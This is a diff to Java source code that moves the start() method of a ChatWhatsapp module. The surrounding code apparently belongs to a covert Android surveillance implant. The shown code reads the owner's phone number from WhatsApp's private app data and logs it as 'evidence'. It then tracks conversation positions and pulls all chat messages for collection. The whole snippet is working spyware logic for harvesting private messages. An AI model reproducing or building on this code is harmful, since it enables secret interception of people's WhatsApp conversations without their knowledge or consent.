@@ -69,6 +69,41 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * Estrae dal file RegisterPhone.xml il numero di telefono
 	 * @return
 	 */
+	@Override
+	protected void start() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStart)");
+		}
+		hastableConversationLastIndex = new Hashtable<String, Integer>();
+		try {
+			myPhoneNumber = readMyPhoneNumber();
+			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
+	
+			if (markup.isMarkup()) {
+				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
+				Enumeration<String> keys = hastableConversationLastIndex.keys();
+	
+				while (keys.hasMoreElements()) {
+					String key = keys.nextElement();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
+					}
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart), get all Chats");
+				}
+	
+				readChatMessages();
+			}
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart), " + e);
+			}
+		}
+	
+	}
+
 	private String readMyPhoneNumber() {
 		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
 		/*
@@ -136,40 +171,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		return "me";
 	}
 	
-	@Override
-	protected void start() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (actualStart)");
-		}
-		hastableConversationLastIndex = new Hashtable<String, Integer>();
-		try {
-			myPhoneNumber = readMyPhoneNumber();
-			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
-
-			if (markup.isMarkup()) {
-				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
-				Enumeration<String> keys = hastableConversationLastIndex.keys();
-
-				while (keys.hasMoreElements()) {
-					String key = keys.nextElement();
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
-					}
-				}
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart), get all Chats");
-				}
-
-				readChatMessages();
-			}
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualStart), " + e);
-			}
-		}
-
-	}
+	
 
 	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
 	// chat_list,messages where chat_list.key_remote_jid =
